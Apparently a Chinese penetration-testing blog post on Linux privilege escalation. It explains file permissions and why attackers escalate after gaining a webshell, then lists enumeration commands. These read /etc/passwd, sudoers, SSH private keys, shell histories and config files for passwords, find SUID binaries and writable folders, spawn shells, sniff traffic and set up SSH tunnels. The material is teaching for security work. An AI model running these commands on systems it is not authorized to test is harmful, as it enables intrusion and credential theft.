+drwxrwxr-x <span class="hljs-number">8</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> .git
+drwxrwxr-x <span class="hljs-number">3</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> .github
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx   <span class="hljs-number">101</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> .gitignore
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx   <span class="hljs-number">737</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> LICENSE
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx  <span class="hljs-number">4021</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> Makefile
+lrwxrwxrwx  <span class="hljs-number">1</span> kali kali      <span class="hljs-number">28</span> May <span class="hljs-number">14</span> <span class="hljs-number">08</span>:<span class="hljs-number">28</span> flagg -&gt; /proc/self/cwd/flag/flag.jpg
+drwxrwxr-x <span class="hljs-number">2</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> man
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx  <span class="hljs-number">1364</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> README-android.txt
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx <span class="hljs-number">19917</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> README.md
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx  <span class="hljs-number">1941</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> README-win32.txt
+drwxrwxr-x <span class="hljs-number">2</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> src
+drwxrwxr-x <span class="hljs-number">2</span> hybcx hybcx  <span class="hljs-number">4096</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> tests
+-rw-rw-r-- <span class="hljs-number">1</span> hybcx hybcx    <span class="hljs-number">65</span> Jul <span class="hljs-number">20</span> <span class="hljs-number">21</span>:<span class="hljs-number">54</span> .vimrc</code></pre>
+<p>看一下这些数据代表什么意思，从第一个字段看</p>
+<pre><code class="hljs scss">-rw-r<span class="hljs-attr">--r--</span>  <span class="hljs-number">1</span> root root      <span class="hljs-number">56</span> Jun <span class="hljs-number">16</span> <span class="hljs-number">23</span>:<span class="hljs-number">29</span> hash.txt</code></pre>
+<p>这里可以分为7个字段。</p>
+<ul>
+<li>第一组数据&nbsp;<code>-rw-r--r--</code></li>
+</ul>
+<p>第一位：</p>
+<p><code>-</code>&nbsp;: 代表普通文件</p>
+<p><code>d</code>：代表目录</p>
+<p><code>l</code>：代表软链接</p>
+<p><code>b</code>：代表块文件</p>
+<p><code>c</code>：代表字符设备</p>
+<p>第二及后面几位,分别三个为一组：</p>
+<p><code>rw-r--r--</code>&nbsp;代表文件所属的权限</p>
+<p>r : 文件可读。w : 文件可修改。- : 表示暂时没有其他权限。x : 表示可执行</p>
+<ol>
+<li><code>rw-</code>&nbsp;表示文件所拥有者的权限。</li>
+<li><code>r--</code>&nbsp;表示文件所在组的用户的权限。</li>
+<li><code>r--</code>&nbsp;表示其他组的用户的权限。</li>
+<li>第二组数据&nbsp;<code>1</code>
+<ul>
+<li>如果文件类型为目录，表示目录下的字目录个数</li>
+<li>如果文件类型是普通文件，这个数据就表示这个文件的硬链接个数</li>
+</ul>
+</li>
+<li>第三组数据&nbsp;<code>root</code>&nbsp;. 表示该文件所有者为root 用户</li>
+<li>第四组数据<code>root</code>. 表示该文件所在组为root 组</li>
+<li>第五组数据<code>56</code>&nbsp;表示文件的大小为多少字节。如果为一个目录，则为4096。</li>
+<li>第六组数据表示<code>最后一次修改时间</code></li>
+<li>第七组数据表示文件名称</li>
+</ol>
+<blockquote>
+<p>如果为目录，r 表示可以进入该目录进行查看。 w 表示文件可以进行增加。x 表示可以进入这个目录</p>
+</blockquote>
+<p>同样的，可以用数字代替，r=4,w=2,x=1。</p>
+<h2 id="linux内核版本">Linux内核版本</h2>
+<p>内核是系统的心脏，是运行程序和管理磁盘等硬件设备的核心程序。是硬件设备和软件程序间的抽象层。Linux内核的开发和规范一直是由Linus领导的开发小组控制着，版本是唯一的。开发小组每隔一段时间公布新的版本或修订版，从1991年10月开始，Linus向世界公开发布的内核0.0.2版本到目前最新的内核5.911版本，Linux的功能越来越强大。</p>
+<p>Linux内核的版本号命名是有一定规则的，版本号的格式通常为"主版本号.次版本号.修正号”。主版本号和次版本号标志着重要的功能变动，修正号表示较小的功能变更。以5.9.11版本为例，5代表主版本号，9代表次版本号，11代表修正号。其中次版本还有特定的意义：如果是偶数数字，就表示该内核是一个可以放心使用的稳定版；如果是奇数数字，则表示该内核加入了某些测试的新功能，是一个内部可能存在着bug的测试版。</p>
+<h2 id="linux发行版本">Linux发行版本</h2>
+<p>从技术上来说，Linus开发的Linux只是一个内核。内核指的是一个提供设备驱动、文件系统、进程管理、网络通信等功能的系统软件，内核并不是一套完整的操作系统，它只是操作系统的核心。</p>
+<p>一些组织或厂商将Linux内核与各种软件和文档包装起来，并提供系统安装界面和系统配置、设定与管理工具，就构成了Linux的发行版本。Linux的发行版就是将Linux内核与应用软件做一个打包。</p>
+<p>现在存在成千上万个Linux的发行版本。</p>
+<ul>
+<li>Arch系列:Arch、Manjaro</li>
+<li>RedHat系列:RedHat、CentOS、Fedora</li>
+<li>Debian系列：Debian、Ubuntu、Deepin、Mint</li>
+<li>SUSE系列：opebSUSE</li>
+<li>其他系列</li>
+</ul>
+<h2 id="linux提权概念">Linux提权概念</h2>
+<p>特权提升（Privilegeescalation）是指利用操作系统或应用软件中的程序漏洞、设计缺陷或配置疏忽来获取对应用程序或用户来说受保护资源的高级访问权限。其结果是，应用程序可以获取比应用程序开发者或系统管理员预期的更高的特权，从而可以执行授权的动作。</p>
+<p>Linux提权一般是指获取root用户权限的操作过程。</p>
+<h2 id="linux提权目的">Linux提权目的</h2>
+<p>提权操作有风险为什么还要进行提权？什么情况下需要进行提权？获取高权限之后可以做什么？</p>
+<p>通过命令执行漏洞获取的一个反弹shell或是通过Web漏洞获取了一个Webshell后，一般情况下权限都较低。在执行一些重要敏感的操作或是对重要的文件进行修改时无法正常进行，便需要进行提权。Linux中安装的数据库、中间件等一般都不是以root用户启动的，通过数据库或是中间件获取到的权限是是低权限的。</p>
+<p>当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一下命令或者读取/root 下的重要文件。这个时候就需要提权，在root 权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p>
+<blockquote>
+<p>简单来说，就是不提权，就无法进一步渗透</p>
+</blockquote>
+<p>获取root权限之后可以达到的效果：</p>
+<ol>
+<li>读取写入服务器中的重要文件：
+<ul>
+<li>修改Root密码</li>
+<li>替换系统命令</li>
+</ul>
+</li>
+<li>在系统中放置更为隐蔽的后门：
+<ul>
+<li>ping后门</li>
+<li>Rookit</li>
+</ul>
+</li>
+<li>保证服务器在重启之后权限仍然存在：
+<ul>
+<li>内存后门</li>
+</ul>
+</li>
+</ol>
+<h2 id="linux提权本质">Linux提权本质</h2>
+<blockquote>
+<p>师傅们都说，渗透的本质是信息搜集</p>
+</blockquote>
+<p>提权也是，需要充分完整的信息搜集；另一方面，是对操作系统内核漏洞的掌握情况。</p>
+<p>提权思路：大概思路是通过信息搜集查找可利用的文件/脚本/软件/用户/内核漏洞/恶意劫持/特定平台漏洞/框架漏洞/组件/等，写入或执行恶意命令/脚本/shell/添加高权限用户，提权成功，然后进一步利用。</p>
+<h1 id="0x03-linux信息搜集">0x03 Linux信息搜集</h1>
+<h2 id="内核-操作系统-设备信息">内核、操作系统、设备信息</h2>
+<p>看他什么发行类型、什么版本。内核版本又是多少，是不是64位</p>
+<pre><code class="hljs scss">内核，操作系统，设备信息
+uname -<span class="hljs-selector-tag">a</span>    打印所有可用的系统信息
+uname -r    内核版本
+uname -n    系统主机名。
+uname -m    查看系统内核架构（<span class="hljs-number">64</span>位/<span class="hljs-number">32</span>位）
+hostname    系统主机名
+cat /proc/version    内核信息
+cat /etc<span class="hljs-comment">/*-release   分发信息</span>
+<span class="hljs-comment">cat /etc/issue       分发信息</span>
+<span class="hljs-comment">cat /proc/cpuinfo    CPU信息</span>
+<span class="hljs-comment">cat /etc/lsb-release # Debian </span>
+<span class="hljs-comment">cat /etc/redhat-release # Redhat</span>
+<span class="hljs-comment">ls /boot | grep vmlinuz-</span></code></pre>
+<pre><code class="hljs scss">┌──(hybcx㉿kali)-<span class="hljs-selector-attr">[~]</span>
+└─$ cat /etc<span class="hljs-comment">/*-release</span>
+<span class="hljs-comment">PRETTY_NAME="Kali GNU/Linux Rolling"</span>
+<span class="hljs-comment">NAME="Kali GNU/Linux"</span>
+<span class="hljs-comment">VERSION_ID="2024.2"</span>
+<span class="hljs-comment">VERSION="2024.2"</span>
+<span class="hljs-comment">VERSION_CODENAME=kali-rolling</span>
+<span class="hljs-comment">ID=kali</span>
+<span class="hljs-comment">ID_LIKE=debian</span>
+<span class="hljs-comment">HOME_URL="https://www.kali.org/"</span>
+<span class="hljs-comment">SUPPORT_URL="https://forums.kali.org/"</span>
+<span class="hljs-comment">BUG_REPORT_URL="https://bugs.kali.org/"</span>
+<span class="hljs-comment">ANSI_COLOR="1;31"</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">┌──(hybcx㉿kali)-[~]</span>
+<span class="hljs-comment">└─$ ls /etc/ | grep *-release</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">┌──(hybcx㉿kali)-[~]</span>
+<span class="hljs-comment">└─$ ls /etc/ | grep release  </span>
+<span class="hljs-comment">os-release</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">┌──(hybcx㉿kali)-[~]</span>
+<span class="hljs-comment">└─$ cat /etc/issue    </span>
+<span class="hljs-comment">Kali GNU/Linux Rolling \n \l</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">┌──(hybcx㉿kali)-[~]</span>
+<span class="hljs-comment">└─$ ls /boot               </span>
+<span class="hljs-comment">config-6.6.15-amd64  grub                     initrd.img-6.8.11-amd64  System.map-6.8.11-amd64  vmlinuz-6.8.11-amd64</span>
+<span class="hljs-comment">config-6.8.11-amd64  initrd.img-6.6.15-amd64  System.map-6.6.15-amd64  vmlinuz-6.6.15-amd64</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">┌──(hybcx㉿kali)-[~]</span>
+<span class="hljs-comment">└─$ ls /boot | grep vmlinuz-</span>
+<span class="hljs-comment">vmlinuz-6.6.15-amd64</span>
+<span class="hljs-comment">vmlinuz-6.8.11-amd64</span></code></pre>
+<h2 id="用户和群组">用户和群组</h2>
+<pre><code class="hljs scss">cat /etc/passwd     列出系统上的所有用户
+cat /<span class="hljs-selector-tag">var</span>/mail/root
+cat /<span class="hljs-selector-tag">var</span>/spool/mail/root
+cat /etc/group      列出系统上的所有组
+grep -v -E "^#" /etc/passwd | awk -F: <span class="hljs-string">'$3 == 0 { print $1}'</span>      列出所有的超级用户账户
+whoami              查看当前用户
+w                   谁目前已登录，他们正在做什么
+last                最后登录用户的列表
+lastlog             所有用户上次登录的信息
+lastlog –u %username%  有关指定用户上次登录的信息
+lastlog |grep -v <span class="hljs-string">"Never"</span>  以前登录用户的完</code></pre>
+<h2 id="用户权限信息">用户权限信息</h2>
+<pre><code class="hljs scss">whoami        当前用户名
+id            当前用户信息
+cat /etc/sudoers  谁被允许以root身份执行
+sudo -l       当前用户可以以root身份执行操作</code></pre>
+<h2 id="环境信息">环境信息</h2>
+<p>可能存在密码或者API密钥</p>
+<pre><code class="hljs scss">env        显示环境变量
+set        设置或显示shell环境的变量和函数
+echo <span class="hljs-variable">$PATH</span> 路径信息
+history    显示当前用户的历史命令记录
+pwd        输出工作目录
+cat /etc/profile   显示默认系统变量
+cat /etc/shells    显示可用的shellrc
+cat /etc/bashrc or cat /etc/bash<span class="hljs-selector-class">.bashrc</span>
+cat ~/<span class="hljs-selector-class">.bash_profile</span>
+cat ~/<span class="hljs-selector-class">.bashrc</span>
+cat ~/<span class="hljs-selector-class">.bash_logout</span>
+cat ~/<span class="hljs-selector-class">.bash_history</span> 显示当前用户主目录中的历史记录文件
+cat ~/<span class="hljs-selector-class">.bash_original</span></code></pre>
+<p>对于$PATH：如果您对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制文件</p>
+<h2 id="进程和服务">进程和服务</h2>
+<p>哪些服务在运行，哪个服务具有哪个用户的特权</p>
+<pre><code class="hljs scss">ps aux
+ps -ef
+<span class="hljs-attribute">top</span>
+cat /etc/services</code></pre>
+<p>查看以root 运行的进程：<br>
+root正在运行哪些服务，在这些易受攻击的服务中，请仔细检查</p>
+<pre><code class="hljs scss">ps aux | grep root
+ps -ef | grep root</code></pre>
+<h2 id="查看安装的软件">查看安装的软件</h2>
+<p>安装了哪些应用程序，他们是什么版本的，他们目前还在运行吗</p>
+<pre><code class="hljs scss">ls -alh /usr/bin/
+ls -alh /sbin/
+ls -alh /<span class="hljs-selector-tag">var</span>/cache/yum/
+dpkg -l</code></pre>
+<h2 id="服务插件">服务/插件</h2>
+<p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p>
+<pre><code class="hljs scss">cat /etc/syslog<span class="hljs-selector-class">.conf</span>
+cat /etc/chttp<span class="hljs-selector-class">.conf</span>
+cat /etc/lighttpd<span class="hljs-selector-class">.conf</span>
+cat /etc/cups/cupsd<span class="hljs-selector-class">.conf</span>
+cat /etc/inetd<span class="hljs-selector-class">.conf</span>
+cat /etc/apache2/apache2<span class="hljs-selector-class">.conf</span>
+cat /etc/my<span class="hljs-selector-class">.conf</span>
+cat /etc/httpd/conf/httpd<span class="hljs-selector-class">.conf</span>
+cat /opt/lampp/etc/httpd<span class="hljs-selector-class">.conf</span>
+ls -aRl /etc/ | awk '$<span class="hljs-number">1</span> ~ /^.*r.*/'</code></pre>
+<h2 id="计划任务">计划任务</h2>
+<p>计划了哪些工作</p>
+<pre><code class="hljs scss">crontab -l
+ls -alh /<span class="hljs-selector-tag">var</span>/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at<span class="hljs-selector-class">.allow</span>
+cat /etc/at<span class="hljs-selector-class">.deny</span>
+cat /etc/cron<span class="hljs-selector-class">.allow</span>
+cat /etc/cron<span class="hljs-selector-class">.deny</span>
+cat /etc/crontab
+cat /etc/anacrontab
+cat /<span class="hljs-selector-tag">var</span>/spool/cron/crontabs/root</code></pre>
+<h2 id="有无明文存放用户密码">有无明文存放用户密码</h2>
+<ol>
+<li>检查web服务器连接到数据库的文件（config.php类似文件）</li>
+<li>检查数据库以获取可能被重用的管理员密码</li>
+<li>检查弱密码</li>
+</ol>
+<pre><code class="hljs scss">grep -<span class="hljs-selector-tag">i</span> user <span class="hljs-selector-attr">[filename]</span>
+grep -<span class="hljs-selector-tag">i</span> pass <span class="hljs-selector-attr">[filename]</span>
+grep -C <span class="hljs-number">5</span> "password" <span class="hljs-selector-attr">[filename]</span>
+find . -name "*<span class="hljs-selector-class">.php</span>" -print0 | xargs -<span class="hljs-number">0</span> grep -<span class="hljs-selector-tag">i</span> -n "<span class="hljs-selector-tag">var</span> <span class="hljs-variable">$password</span>"</code></pre>
+<h2 id="有无ssh-私钥">有无ssh 私钥</h2>
+<pre><code class="hljs scss">cat ~/<span class="hljs-selector-class">.ssh</span>/authorized_keys
+cat ~/<span class="hljs-selector-class">.ssh</span>/identity<span class="hljs-selector-class">.pub</span>
+cat ~/<span class="hljs-selector-class">.ssh</span>/identity
+cat ~/<span class="hljs-selector-class">.ssh</span>/id_rsa<span class="hljs-selector-class">.pub</span>
+cat ~/<span class="hljs-selector-class">.ssh</span>/id_rsa
+cat ~/<span class="hljs-selector-class">.ssh</span>/id_dsa<span class="hljs-selector-class">.pub</span>
+cat ~/<span class="hljs-selector-class">.ssh</span>/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key<span class="hljs-selector-class">.pub</span>
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key<span class="hljs-selector-class">.pub</span>
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key<span class="hljs-selector-class">.pub</span>
+cat /etc/ssh/ssh_host_key</code></pre>
+<h2 id="查看与当前机器通信的其他用户或者主机">查看与当前机器通信的其他用户或者主机</h2>
+<p>在这种情况下，用户正在运行某些只能从该主机获得的服务。您无法从外部连接到服务。它可能是开发服务器，数据库或其他任何东西。这些服务可能以root用户身份运行，或者其中可能存在漏洞。由于开发人员或用户可能在考虑“由于只有特定用户可以访问它，因此我们不需要花费那么多的安全性”，因此它们可能更加脆弱</p>
+<pre><code class="hljs scss">lsof -<span class="hljs-selector-tag">i</span>
+lsof -<span class="hljs-selector-tag">i</span> :<span class="hljs-number">80</span>
+grep <span class="hljs-number">80</span> /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep <span class="hljs-number">3</span>:on
+last
+w</code></pre>
+<h2 id="日志文件">日志文件</h2>
+<pre><code class="hljs scss">cat /<span class="hljs-selector-tag">var</span>/log/boot<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/cron
+cat /<span class="hljs-selector-tag">var</span>/log/syslog
+cat /<span class="hljs-selector-tag">var</span>/log/wtmp
+cat /<span class="hljs-selector-tag">var</span>/run/utmp
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access<span class="hljs-selector-class">.log</span>
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/apache2/access_log
+cat /<span class="hljs-selector-tag">var</span>/log/apache2/access<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/apache2/error_log
+cat /<span class="hljs-selector-tag">var</span>/log/apache2/error<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/apache/access_log
+cat /<span class="hljs-selector-tag">var</span>/log/apache/access<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/auth<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/chttp<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/cups/error_log
+cat /<span class="hljs-selector-tag">var</span>/log/dpkg<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/faillog
+cat /<span class="hljs-selector-tag">var</span>/log/httpd/access_log
+cat /<span class="hljs-selector-tag">var</span>/log/httpd/access<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/httpd/error_log
+cat /<span class="hljs-selector-tag">var</span>/log/httpd/error<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/lastlog
+cat /<span class="hljs-selector-tag">var</span>/log/lighttpd/access<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/lighttpd/error<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/lighttpd/lighttpd<span class="hljs-selector-class">.access</span><span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/lighttpd/lighttpd<span class="hljs-selector-class">.error</span><span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/log/messages
+cat /<span class="hljs-selector-tag">var</span>/log/secure
+cat /<span class="hljs-selector-tag">var</span>/log/syslog
+cat /<span class="hljs-selector-tag">var</span>/log/wtmp
+cat /<span class="hljs-selector-tag">var</span>/log/xferlog
+cat /<span class="hljs-selector-tag">var</span>/log/yum<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/run/utmp
+cat /<span class="hljs-selector-tag">var</span>/webmin/miniserv<span class="hljs-selector-class">.log</span>
+cat /<span class="hljs-selector-tag">var</span>/www/logs/access_log
+cat /<span class="hljs-selector-tag">var</span>/www/logs/access<span class="hljs-selector-class">.log</span>
+ls -alh /<span class="hljs-selector-tag">var</span>/lib/dhcp3/
+ls -alh /<span class="hljs-selector-tag">var</span>/log/postgresql/
+ls -alh /<span class="hljs-selector-tag">var</span>/log/proftpd/
+ls -alh /<span class="hljs-selector-tag">var</span>/log/samba/
+
+Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre>
+<h2 id="通讯与网络">通讯与网络</h2>
+<p>系统具有哪些NIC。他们是否连接到同一个网络</p>
+<pre><code class="hljs scss">/sbin/ifconfig -<span class="hljs-selector-tag">a</span>
+cat /etc/network/interfaces
+cat /etc/sysconfig/network</code></pre>
+<p>什么是网络配置设置？我们可以找到关于该网络的哪些信息？DHCP服务器？DNS服务器？网关？</p>
+<pre><code class="hljs scss">cat /etc/resolv<span class="hljs-selector-class">.conf</span>
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname</code></pre>
+<h2 id="缓存和路由">缓存和路由</h2>
+<p>缓存了什么，IP地址或MAC地址</p>
+<pre><code class="hljs scss">arp -e
+route
+/sbin/route -nee</code></pre>
+<h2 id="嗅探">嗅探</h2>
+<p>是否能进行数据包的嗅探，可以看到什么</p>
+<pre><code class="hljs scss">tcpdump tcp dst <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.7</span> <span class="hljs-number">80</span> and tcp dst <span class="hljs-number">10.5</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.252</span> <span class="hljs-number">21</span>
+<span class="hljs-comment">//tcpdump tcp dst [ip] [端口]和tcp dst [ip] [端口]</span></code></pre>
+<h2 id="端口转发和隧道">端口转发和隧道</h2>
+<p>重定向流量以便与之交互</p>
+<pre><code class="hljs scss">FPipe<span class="hljs-selector-class">.exe</span> -l <span class="hljs-number">80</span> -r <span class="hljs-number">80</span> -s <span class="hljs-number">80</span> <span class="hljs-number">192.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.7</span>
+<span class="hljs-comment">// FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</span>
+
+ssh -L <span class="hljs-number">8080</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> root@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.7</span> # Local Port
+ssh -R <span class="hljs-number">8080</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> root@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.7</span> # Remote Port
+// ssh-[L / R] [本地端口]：[远程IP]：[远程端口] [本地用户] @[本地IP]</code></pre>
+<p>能否使用隧道，在本地远程发送命令</p>
+<pre><code class="hljs scss">ssh -D <span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>:<span class="hljs-number">9050</span> -N [username]@[ip] 
+proxychains ifconfig</code></pre>
+<h2 id="配置信息">配置信息</h2>
+<p>里面有密码吗？脚本，数据库，配置文件还是日志文件？密码的默认路径和位置</p>
+<pre><code class="hljs scss">cat /<span class="hljs-selector-tag">var</span>/apache2/config<span class="hljs-selector-class">.inc</span>
+cat /<span class="hljs-selector-tag">var</span>/lib/mysql/mysql/user<span class="hljs-selector-class">.MYD</span>
+cat /root/anaconda-ks<span class="hljs-selector-class">.cfg</span></code></pre>
+<p>用户正在做什么？是否有纯文本密码？他们在编辑什么？</p>
+<pre><code class="hljs scss">cat ~/<span class="hljs-selector-class">.bash_history</span> 
+cat ~/<span class="hljs-selector-class">.nano_history</span> 
+cat ~/<span class="hljs-selector-class">.atftp_history</span> 
+cat ~/<span class="hljs-selector-class">.mysql_history</span> 
+cat ~/<span class="hljs-selector-class">.php_history</span></code></pre>
+<h2 id="文件系统">文件系统</h2>
+<p>可以在/ etc /中写入哪些配置文件？能够重新配置服务？</p>
+<pre><code class="hljs scss">ls -aRl /etc/ | awk '$<span class="hljs-number">1</span> ~ /^.*w.*/' <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Anyone </span>
+ls -aRl /etc/ | awk '$<span class="hljs-number">1</span> ~ /^.<span class="hljs-selector-class">.w</span>/' <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Owner </span>
+ls -aRl /etc/ | awk '$<span class="hljs-number">1</span> ~ /^....<span class="hljs-selector-class">.w</span>/' <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Group </span>
+ls -aRl /etc/ | awk '$<span class="hljs-number">1</span> ~ /w.$/' <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Other </span>
+find /etc/ -readable -type f <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Anyone </span>
+find /etc/ -readable -type f -maxdepth <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// Anyone</span></code></pre>
+<p>网站上是否有任何设置/文件（隐藏）？有数据库信息的任何设置文件吗？</p>
+<pre><code class="hljs scss">ls -alhR /<span class="hljs-selector-tag">var</span>/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/</code></pre>
+<p>是否有任何卸载的文件系统？</p>
+<pre><code class="hljs scss">cat /etc/fstab</code></pre>
+<p>可以在哪里写入和执行？一些“常见”位置：/ tmp，/ var / tmp，/ dev /shm</p>
+<pre><code class="hljs scss">find / -writable -type d <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// world-writeable folders</span>
+find / -perm -<span class="hljs-number">222</span> -type d <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// world-writeable folders</span>
+find / -perm -o w -type d <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// world-writeable folders</span>
+find / -perm -o x -type d <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// world-executable folders</span>
+find / \( -perm -o w -perm -o x \) -type d <span class="hljs-number">2</span>&gt;/dev/null <span class="hljs-comment">// world-writeable &amp; world-executable folders</span></code></pre>
+<p>word可写的”没人“文件</p>
+<pre><code class="hljs scss">find / -xdev -type d \( -perm -<span class="hljs-number">0002</span> -a ! -perm -<span class="hljs-number">1000</span> \) -print # world-writ
+find /dir -xdev \( -nouser -o -nogroup \) -print # Noowner files</code></pre>
+<h2 id="交互式shell">交互式shell</h2>
+<pre><code class="hljs scss">python -c 'import pty;pty<span class="hljs-selector-class">.spawn</span>("/bin/bash")'
+echo os<span class="hljs-selector-class">.system</span>('/bin/bash')
+/bin/sh -<span class="hljs-selector-tag">i</span></code></pre>
+<h2 id="可提权suid-ampamp-guid">可提权SUID &amp;&amp; GUID</h2>
+<blockquote>
+<p>参考资料<a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+</blockquote>
+<pre><code class="hljs scss">find / -perm -<span class="hljs-number">1000</span> -type d <span class="hljs-number">2</span>&gt;/dev/null   
+<span class="hljs-comment">// Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
+find / -perm -g=s -type f <span class="hljs-number">2</span>&gt;/dev/null    
+<span class="hljs-comment">// SGID (chmod 2000) - run as the group, not the user who started it.</span>
+find / -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null    
+<span class="hljs-comment">// SUID (chmod 4000) - run as the owner, not the user who started it.</span>
+
+find / -perm -g=s -o -perm -u=s -type f <span class="hljs-number">2</span>&gt;/dev/null    <span class="hljs-comment">// SGID or SUID</span>
+
+for <span class="hljs-selector-tag">i</span> in `locate -r "bin$"`; do find <span class="hljs-variable">$i</span> \( -perm -<span class="hljs-number">4000</span> -o -perm -<span class="hljs-number">2000</span> \) -type f <span class="hljs-number">2</span>&gt;/dev/null; done    
+<span class="hljs-comment">// Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span>
+
+<span class="hljs-comment">// find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span>
+find / -perm -g=s -o -perm -<span class="hljs-number">4000</span> ! -type l -maxdepth <span class="hljs-number">3</span> -exec ls -ld {} \; <span class="hljs-number">2</span>&gt;/dev/null</code></pre>
+<h2 id="查看可写执行目录">查看可写/执行目录</h2>
+<pre><code class="hljs scss">find / -writable -type d <span class="hljs-number">2</span>&gt;/dev/null      # world-writeable folders
+find / -perm -<span class="hljs-number">222</span> -type d <span class="hljs-number">2</span>&gt;/dev/null     # world-writeable folders
+find / -perm -o w -type d <span class="hljs-number">2</span>&gt;/dev/null     # world-writeable folders
+find / -perm -o x -type d <span class="hljs-number">2</span>&gt;/dev/null     # world-executable folders
